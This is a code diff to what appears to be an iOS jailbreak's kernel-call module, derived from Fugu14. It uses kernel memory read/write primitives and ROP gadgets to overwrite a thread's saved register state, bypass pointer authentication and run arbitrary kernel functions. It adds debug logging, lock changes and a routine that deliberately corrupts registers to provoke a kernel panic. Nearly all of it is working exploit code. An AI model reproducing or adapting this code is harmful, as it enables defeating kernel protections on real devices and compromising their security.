@@ -12,6 +12,8 @@
 #import "boot_info.h"
 #import "log.h"
 
+#pragma GCC diagnostic ignored "-Wempty-body"
+
 typedef struct {
 	bool inited;
 	thread_t gExploitThread;
@@ -29,6 +31,7 @@ typedef struct {
 
 typedef struct {
 	thread_t thread;
+	uint64_t threadPtr;
 	uint64_t actContext;
 	kRegisterState signedState;
 	uint64_t kernelStack;
@@ -47,6 +50,24 @@ uint64_t gUserReturnThreadContext = 0;
 volatile uint64_t gUserReturnDidHappen = 0;
 static NSLock *gKcallLock;
 
+uint64_t GetThreadID(thread_t port) {
+
+    thread_identifier_info_data_t info;
+    mach_msg_type_number_t info_count=THREAD_IDENTIFIER_INFO_COUNT;
+    kern_return_t kr=thread_info(port,
+                                 THREAD_IDENTIFIER_INFO,
+                                 (thread_info_t)&info,
+                                 &info_count);
+    if(kr!=KERN_SUCCESS) {
+        /* you can get a description of the error by calling
+         * mach_error_string(kr)
+         */
+        return 0;
+    } else {
+        return info.thread_id;
+    }
+}
+
 uint64_t getUserReturnThreadContext(void) {
 	if (gUserReturnThreadContext != 0) {
 		return gUserReturnThreadContext;
@@ -56,24 +77,28 @@ uint64_t getUserReturnThreadContext(void) {
 	bzero(&state, sizeof(state));
 	
 	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
+	
 	for (size_t i = 0; i < 29; i++) {
 		state.__x[i] = 0xDEADBEEF00ULL | i;
 	}
 	
+	//sleep(1);
+
 	thread_t chThread = 0;
 	kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT, &chThread);
 	if (kr != KERN_SUCCESS) {
 		JBLogError("[-] getUserReturnThreadContext: Failed to create return thread!");
 		return 0;
 	}
-	
-	thread_suspend(chThread);
-	
 	uint64_t returnThreadPtr = task_get_first_thread(self_task());
 	if (returnThreadPtr == 0) {
 		JBLogError("[-] getUserReturnThreadContext: Failed to find return thread!");
 		return 0;
 	}
+
+	thread_suspend(chThread);
+
+	JBLogDebug("returnThread tid=%d, %d", kread64(returnThreadPtr+0x550), GetThreadID(chThread));
 	
 	uint64_t returnThreadACTContext = thread_get_act_context(returnThreadPtr);
 	if (returnThreadACTContext == 0) {
@@ -81,7 +106,27 @@ uint64_t getUserReturnThreadContext(void) {
 		return 0;
 	}
 	
+	JBLogDebug("gUserReturnThreadContext=%llx", gUserReturnThreadContext);
 	gUserReturnThreadContext = returnThreadACTContext;
+
+
+	arm_thread_state64_t old_state;
+	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
+	JBLogDebug("getstate=%d", thread_get_state(chThread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt));
+	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
+	for(int i=0; i<29; i++) {
+		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
+	}
+
+	JBLogDebug("userThread pc=%llx lr=%llx sp=%llx cpsr=%x",
+	kread64(returnThreadACTContext + offsetof(kRegisterState, pc)),
+	kread64(returnThreadACTContext + offsetof(kRegisterState, lr)),
+	kread64(returnThreadACTContext + offsetof(kRegisterState, sp)),
+	kread32(returnThreadACTContext + offsetof(kRegisterState, cpsr)) );
+	for(int i=0; i<29; i++) {
+		uint64_t value = kread64(returnThreadACTContext + offsetof(kRegisterState, x[0]) + i*8);
+		JBLogDebug("userThread.x[%d]=%llx",i,value);
+	}
 	
 	return returnThreadACTContext;
 }
@@ -112,7 +157,11 @@ void Fugu14Kcall_prepareThreadState(Fugu14KcallThread *callThread, KcallThreadSt
 
 uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadState *threadState)
 {
-	[gKcallLock lock];
+	ksync_start();
+
+	//[gKcallLock lock];
+	JBLogDebug("kcall %d, lr=%llx sp=%llx lr=%llx sp=%llx", gUserReturnDidHappen, threadState->lr, threadState->sp, 
+	callThread->signedState.lr, callThread->signedState.sp);
 
 	// Restore signed state first
 	kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
@@ -125,6 +174,8 @@ uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadS
 	}
 	callThread->mappedState->sp = threadState->sp;
 
+	//((struct arm_kernel_saved_state*)((uint64_t)callThread->mappedState + 0x1000))->lr = 0x123456;
+
 	// Reset flag
 	gUserReturnDidHappen = 0;
 	
@@ -133,14 +184,14 @@ uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadS
 	MEMORY_BARRIER
 	
 	// Run the thread
-	thread_resume(callThread->thread);
+	kern_return_t kr1=thread_resume(callThread->thread);
 	
 	// Wait for flag to be set
 	while (!gUserReturnDidHappen) ;
 	
 	// Stop thread
-	thread_suspend(callThread->thread);
-	thread_abort(callThread->thread);
+	kern_return_t kr2=thread_suspend(callThread->thread);
+	kern_return_t kr3=thread_abort(callThread->thread);
 	
 	// Sync all changes
 	// (Probably not required)
@@ -149,20 +200,28 @@ uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadS
 	// Copy return value
 	uint64_t retval = callThread->scratchMemoryMapped[0];
 
-	[gKcallLock unlock];
-	
+	//[gKcallLock unlock];
+
+	ksync_finish();
+
+	JBLogDebug("kcall kr=%d,%d,%d", kr1,kr2,kr3);
 	return retval;
 }
 
 uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func, uint64_t argc, const uint64_t *argv)
 {
-	if (argc >= 19) argc = 19;
-
-	KcallThreadState threadState = { 0 };
-	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
-	threadState.pc = func;
+	assert (argc <= 19);
 
 	[gKcallLock lock];
+
+	KcallThreadState threadState = { 0 };
+		
+	for (size_t i = 0; i < 29; i++) {
+		threadState.x[i] = 0xDEADBEEE00ULL | i;
+	}
+
+	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
+	threadState.pc = func;
 
 	uint64_t regArgc = 0;
 	uint64_t stackArgc = 0;
@@ -174,22 +233,25 @@ uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func,
 		regArgc = argc;
 	}
 
-	// Set register args (x0 - x8)
+	// Set register args (x0 - x7)
 	for (uint64_t i = 0; i < regArgc; i++)
 	{
 		threadState.x[i] = argv[i];
 	}
 
 	// Set stack args
+	threadState.sp -= stackArgc * 8;
 	for (uint64_t i = 0; i < stackArgc; i++)
 	{
 		uint64_t argKaddr = (threadState.sp + i * 0x8);
 		kwrite64(argKaddr, argv[8+i]);
 	}
 
+	uint64_t retVal = Fugu14Kcall_withThreadState(callThread, &threadState);
+
 	[gKcallLock unlock];
 
-	return Fugu14Kcall_withThreadState(callThread, &threadState);
+	return retVal;
 }
 
 uint64_t kcall(uint64_t func, uint64_t argc, const uint64_t *argv)
@@ -213,7 +275,11 @@ uint64_t kcall_with_raw_thread_state(KcallThreadState threadState)
 		if (gIsJailbreakd) return 0;
 		return jbdKcallThreadState(&threadState, true);
 	}
-	return Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
+
+	[gKcallLock lock];
+	uint64_t retVal = Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
+	[gKcallLock unlock];
+	return retVal;
 }
 
 uint64_t kcall_with_thread_state(KcallThreadState threadState)
@@ -223,8 +289,11 @@ uint64_t kcall_with_thread_state(KcallThreadState threadState)
 		return jbdKcallThreadState(&threadState, false);
 	}
 
+	[gKcallLock lock];
 	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
-	return kcall_with_raw_thread_state(threadState);
+	uint64_t retVal = Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
+	[gKcallLock unlock];
+	return retVal;
 }
 
 uint64_t initPACPrimitives(uint64_t kernelAllocation)
@@ -235,19 +304,23 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 
 	gKcallLock = [[NSLock alloc] init];
 
+	//sleep(1);
+
 	thread_t thread = 0;
 	kern_return_t kr = thread_create(mach_task_self_, &thread);
 	if (kr != KERN_SUCCESS) {
 		JBLogError("[-] setupFugu14Kcall: thread_create failed!");
 		return false;
 	}
-	
 	// Find the thread
 	uint64_t threadPtr = task_get_first_thread(self_task());
 	if (threadPtr == 0) {
 		JBLogError("[-] setupFugu14Kcall: Failed to find thread!");
 		return false;
 	}
+
+	JBLogDebug("thread=%llx tid=%d, %d", threadPtr, kread64(threadPtr+0x550), GetThreadID(thread));
+	JBLogDebug("thread context %llx %llx", kread64(threadPtr+0xa8), kread64(threadPtr+0xa8+8));
 
 	// Get it's state pointer
 	uint64_t actContext = thread_get_act_context(threadPtr);
@@ -256,12 +329,36 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 		return false;
 	}
 
-	// stack is at middle of allocation
+	JBLogDebug("actContext=%llx pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", actContext,
+	kread64(actContext + offsetof(kRegisterState, pc)),
+	kread64(actContext + offsetof(kRegisterState, lr)),
+	kread64(actContext + offsetof(kRegisterState, sp)),
+	kread32(actContext + offsetof(kRegisterState, cpsr)),
+	kread64(actContext + 0x128) );
+	for(int i=0; i<29; i++) {
+		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
+		JBLogDebug("actContext.x[%d]=%llx",i,value);
+	}
+
+	// for testing "Invalid Kernel Stack Pointer" panic
+	for (size_t i = 0; i < 29; i++) {
+		kwrite64(actContext + offsetof(kRegisterState, x[0]) + i*8, 0xDEADBEED00ULL | i);
+	}
+	
+	arm_thread_state64_t old_state;
+	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
+	JBLogDebug("getstate=%d", thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt));
+	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
+	for(int i=0; i<29; i++) {
+		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
+	}
+
+	// stack is at middle of allocation // # define KERNEL_STACK_SIZE	(4*4*4096)=0x10000
 	uint64_t stack = kernelAllocation + 0x8000ULL;
 
 	// Write context
 
-	uint64_t str_x8_x9_gadget = bootInfo_getSlidUInt64(@"str_x8_x9_gadget");
+	uint64_t str_x8_x9_gadget = bootInfo_getSlidUInt64(@"str_x8_x9_gadget"); //str x8,[x9]  ret
 	uint64_t exception_return_after_check = bootInfo_getSlidUInt64(@"exception_return_after_check");
 	uint64_t brX22 = bootInfo_getSlidUInt64(@"br_x22_gadget");
 
@@ -272,11 +369,11 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
 	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);
 
-	// Use str x8, [x9] gadget to set TH_KSTACKPTR
-	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
+	// Use str x8, [x9] gadget to set TH_KSTACKPTR (TH_KSTACKPTR must be in current stack range since CHECK_KERNEL_STACK in el1_sp0_synchronous_vector_long)
+	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x1000); //space for thread_kernel_state(TH_KSTACKPTR), needed size=0xD0
 	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));
 
-	// SP and x0 should both point to the new CPU state
+	// SP and x0 should both point to the new CPU state (mov x0,sp in exception_return, before exception_return_after_check)
 	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
 	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);
 
@@ -284,9 +381,21 @@ uint64_t initPACPrimitives(uint64_t kernelAllocation)
 	// Include in signed state since it is rarely changed
 	kwrite64(actContext + offsetof(kRegisterState, x[2]), get_cspr_kern_intr_en());
 
+	JBLogDebug("actContext pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", 
+	kread64(actContext + offsetof(kRegisterState, pc)),
+	kread64(actContext + offsetof(kRegisterState, lr)),
+	kread64(actContext + offsetof(kRegisterState, sp)),
+	kread32(actContext + offsetof(kRegisterState, cpsr)),
+	kread64(actContext + 0x128) );
+	for(int i=0; i<29; i++) {
+		uint64_t value = kread64(actContext + offsetof(kRegisterState, x[0]) + i*8);
+		JBLogDebug("actContext.x[%d]=%llx",i,value);
+	}
+
 	kRegisterState *mappedState = kvtouaddr(stack);
 
 	gFugu14KcallThread.thread              = thread;
+	gFugu14KcallThread.threadPtr           = threadPtr;
 	gFugu14KcallThread.kernelStack         = stack;
 	gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
 	gFugu14KcallThread.mappedState         = mappedState;
@@ -311,8 +420,22 @@ void finalizePACPrimitives(void)
 	thread_t thread = gFugu14KcallThread.thread;
 	kRegisterState *mappedState = gFugu14KcallThread.mappedState;
 
+	uint64_t threadPtr = gFugu14KcallThread.threadPtr;
+	JBLogDebug("thread context %llx %llx", kread64(threadPtr+0xa8), kread64(threadPtr+0xa8+8));
+
 	// Create a copy of signed state
 	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));
+
+	JBLogDebug("signedState pc=%llx lr=%llx sp=%llx cpsr=%x jophash=%llx", 
+	gFugu14KcallThread.signedState.pc, 
+	gFugu14KcallThread.signedState.lr, 
+	gFugu14KcallThread.signedState.sp,
+	gFugu14KcallThread.signedState.cpsr,
+	*(uint64_t*)((uint64_t)&gFugu14KcallThread.signedState + 0x128) );
+	for(int i=0; i<29; i++) {
+		uint64_t value = gFugu14KcallThread.signedState.x[i];
+		JBLogDebug("signedState.x[%d]=%llx",i,value);
+	}
 
 	// Save signed state for later generations
 	NSData *signedStateData = [NSData dataWithBytes:&gFugu14KcallThread.signedState length:sizeof(kRegisterState)];
@@ -323,7 +446,7 @@ void finalizePACPrimitives(void)
 	// x1 -> new pc
 	// x3 -> new lr
 	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
-	// We don't need lr here
+	// We don't need lr here (eret to user thread directly)
 
 	// New state
 	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
@@ -344,17 +467,39 @@ void finalizePACPrimitives(void)
 	// Sync all changes
 	// (Probably not required)
 	MEMORY_BARRIER
+
+	JBLogDebug("mappedState pc=%llx lr=%llx sp=%llx cpsr=%x", mappedState->pc, mappedState->lr, mappedState->sp, mappedState->cpsr);
+	for(int i=0; i<29; i++) {
+		uint64_t value = mappedState->x[i];
+		JBLogDebug("mappedState.x[%d]=%llx",i,value);
+	}
+	arm_thread_state64_t old_state;
+	mach_msg_type_number_t old_stateCnt = ARM_THREAD_STATE64_COUNT;
+	JBLogDebug("getstate=%d, %d", thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&old_state, &old_stateCnt), old_stateCnt);
+	JBLogDebug("armstate pc=%llx lr=%llx sp=%llx", old_state.__opaque_pc, old_state.__opaque_lr, old_state.__opaque_sp);
+	for(int i=0; i<29; i++) {
+		JBLogDebug("armstate.x[%d]=%llx",i,old_state.__x[i]);
+	}
 	
 	// Run the thread
 	thread_resume(thread);
+
+	JBLogDebug("thread resumed");
 	
 	// Wait for flag to be set
 	while (!gUserReturnDidHappen) ;
+
+	JBLogDebug("thread return to user");
 	
 	// Stop thread
 	thread_suspend(thread);
 	thread_abort(thread);
+
+	sleep(1);
+	gUserReturnDidHappen = 0;
 	
+	JBLogDebug("thread stoped");
+
 	// Done!
 	// Thread's fault handler is now set to the br x22 gadget
 	gKCallStatus = kKcallStatusFinalized;
@@ -404,8 +549,8 @@ int signStateOverLaunchd(uint64_t actContext)
 // boomerang <-> launchd (using libfilecom)
 int signStateLibFileCom(uint64_t actContext, NSString *from, NSString *to)
 {
-	NSString *fromPath = [NSString stringWithFormat:prebootPath(@"basebin/.communication/%@_to_%@"), from, to];
-	NSString *toPath = [NSString stringWithFormat:prebootPath(@"basebin/.communication/%@_to_%@"), to, from];
+	NSString *fromPath = [NSString stringWithFormat:jbrootPath(@"/var/.communication/%@_to_%@"), from, to];
+	NSString *toPath = [NSString stringWithFormat:jbrootPath(@"/var/.communication/%@_to_%@"), to, from];
 	dispatch_semaphore_t sema = dispatch_semaphore_create(0);
 	FCHandler *handler = [[FCHandler alloc] initWithReceiveFilePath:fromPath sendFilePath:toPath];
 	handler.receiveHandler = ^(NSDictionary *message) {
